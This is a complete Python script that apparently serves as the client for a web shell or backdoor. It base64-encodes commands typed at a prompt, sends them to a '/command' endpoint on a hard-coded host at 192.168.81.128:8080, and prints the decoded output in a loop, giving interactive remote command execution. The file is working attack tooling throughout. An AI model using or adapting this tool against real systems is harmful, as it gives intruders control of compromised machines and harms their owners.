#!/usr/bin/env python3

from urllib.request import urlopen
from base64 import b64encode, b64decode

# Config
RHOST="192.168.81.128"
RPORT=8080

# Helper
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

# Main
def shell():
    try:
        # Input
        cmd = input(" $ ")
        encoded_cmd = to_base64(cmd)
        # Req
        url = f"http://{RHOST}:{RPORT}/command?cmd={encoded_cmd}"
        print(f" > {url}")
        response = urlopen(url)
        # Resp
        content = response.read().decode("utf-8")
        content = from_base64(content)
        print(content)
    except Exception as e:
        raise e
        print(f"Error: {e}")
    
def main():
    try:
        while 1: shell()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__': main()